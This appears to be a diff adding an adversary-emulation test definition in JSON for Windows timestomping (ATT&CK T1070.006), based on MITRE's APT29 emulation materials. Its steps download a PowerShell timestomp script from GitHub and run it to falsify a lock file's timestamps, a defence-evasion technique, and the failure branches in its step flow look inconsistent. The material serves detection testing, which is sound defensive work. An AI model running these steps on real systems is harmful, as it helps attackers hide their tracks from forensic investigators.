@@ -1,0 +1,139 @@
+{
+  "id": "d7512c33-3a75-4806-9893-69abc3ccdd43",
+  "name": "Windows - Timestomp a File",
+  "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT\u0026CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "7fcafd9c-c65a-43b8-bda0-b3e2dfbeb7c9",
+      "type": "execute-command",
+      "data": {
+        "command": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5888e0d3-c845-4b34-b257-157bba1e5b88",
+      "name": "Check dependency 1/2",
+      "description": "timestomp.ps1 must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_path}\\timestomp.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "75b5eb77-f73a-4504-833c-3205a4396d75",
+      "name": "Resolve dependency 1/2",
+      "description": "timestomp.ps1 must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a29b625e-c7e5-40d6-a681-1b77912bb481",
+      "name": "Re-check dependency 1/2",
+      "description": "timestomp.ps1 must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_path}\\timestomp.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f561942f-1989-4297-940e-d8e6faef48d7",
+      "name": "Check dependency 2/2",
+      "description": "kxwn.lock must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a307a44f-2c03-4944-a48b-62fa33045efc",
+      "name": "Resolve dependency 2/2",
+      "description": "kxwn.lock must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5ef0844e-2767-4228-a477-c5c525845a3a",
+      "name": "Re-check dependency 2/2",
+      "description": "kxwn.lock must be present in #{file_path}.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "5888e0d3-c845-4b34-b257-157bba1e5b88",
+      "p": "on-success",
+      "o": "7fcafd9c-c65a-43b8-bda0-b3e2dfbeb7c9"
+    },
+    {
+      "s": "5888e0d3-c845-4b34-b257-157bba1e5b88",
+      "p": "on-failure",
+      "o": "75b5eb77-f73a-4504-833c-3205a4396d75"
+    },
+    {
+      "s": "75b5eb77-f73a-4504-833c-3205a4396d75",
+      "p": "on-success",
+      "o": "a29b625e-c7e5-40d6-a681-1b77912bb481"
+    },
+    {
+      "s": "a29b625e-c7e5-40d6-a681-1b77912bb481",
+      "p": "on-failure",
+      "o": "7fcafd9c-c65a-43b8-bda0-b3e2dfbeb7c9"
+    },
+    {
+      "s": "f561942f-1989-4297-940e-d8e6faef48d7",
+      "p": "on-success",
+      "o": "7fcafd9c-c65a-43b8-bda0-b3e2dfbeb7c9"
+    },
+    {
+      "s": "f561942f-1989-4297-940e-d8e6faef48d7",
+      "p": "on-failure",
+      "o": "a307a44f-2c03-4944-a48b-62fa33045efc"
+    },
+    {
+      "s": "a307a44f-2c03-4944-a48b-62fa33045efc",
+      "p": "on-success",
+      "o": "5ef0844e-2767-4228-a477-c5c525845a3a"
+    },
+    {
+      "s": "5ef0844e-2767-4228-a477-c5c525845a3a",
+      "p": "on-failure",
+      "o": "7fcafd9c-c65a-43b8-bda0-b3e2dfbeb7c9"
+    }
+  ],
+  "tags": [
+    "T1070.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_path",
+      "type": "string",
+      "description": "File path for timestomp payload",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads"
+    }
+  ]
+}
